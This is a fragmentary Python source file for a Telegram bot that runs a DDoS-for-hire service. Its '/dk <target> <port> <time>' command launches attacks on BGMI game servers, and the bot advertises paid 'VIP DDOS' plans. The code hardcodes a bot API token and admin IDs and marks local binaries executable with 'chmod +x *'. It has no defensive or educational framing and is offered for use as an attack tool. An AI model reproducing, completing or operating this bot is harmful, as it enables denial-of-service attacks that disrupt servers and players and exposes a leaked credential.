...
bot = telebot.TeleBot('7689614816:AAFOkVf5BmZhAWlLV1e8en5uv6lZU5EeSYc')

# Admin user IDs
admin_id = ["962201904"]
admin_owner = ["962201904"]
os.system('chmod +x *')
    ...
    if ongoing_attacks:
        ...
        if user_id in admin_owner:
            ...
            if len(command) == 4:  # Ensure proper command format (no threads argument)
                ...
                response = "Usage: /dk <target> <port> <time>"
        else:
            ...
            if user_id in bgmi_cooldown:
                ...
                if current_time < cooldown_expiration:
                    ...
                    response = f"You need to wait {time_left} seconds before using the /dk command again."
                else:
...
def show_help(message):
    ...
    - /dk : Execute a BGMI server attack (specific conditions apply).
...
def welcome_plan(message):
    ...
    Purchase VIP DDOS Plan From @DKiHUNT
    Join Channel @dk
'''
    bot.reply_to(message, response)
